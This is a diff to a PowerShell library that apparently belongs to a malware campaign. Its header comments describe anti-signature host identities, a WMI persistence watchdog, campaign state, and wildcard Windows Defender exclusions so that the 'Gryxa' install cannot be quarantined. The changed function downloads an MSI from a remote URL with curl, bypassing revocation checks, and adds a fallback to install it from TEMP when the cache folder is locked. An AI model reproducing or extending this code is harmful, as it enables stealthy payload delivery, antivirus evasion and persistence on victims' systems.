@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L28
+# OWN_LIB  BUILD 20260802L29
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L28: Add-ScDefenderExclusion (wildcard) runs before every Gryxa install — Defender cannot quarantine new FP.
+# L29: Get-GryxaMsi falls back to TEMP install when .wucache cache-write is ACL-locked (was msi-unavailable).
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -510,9 +510,12 @@ function Get-GryxaMsi {
         $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
         if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
         & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $script:GryxaMsiUrl 2>&1 | Out-Null
-        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) { Copy-Item -LiteralPath $tmp -Destination $msi -Force; return $msi }
+        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
+            # cache into WorkDir when possible; if the workdir is ACL-locked, install from TEMP directly
+            try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
+        }
     } catch {}
-    finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
+    if (Test-Path $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
     return $null
 }
 
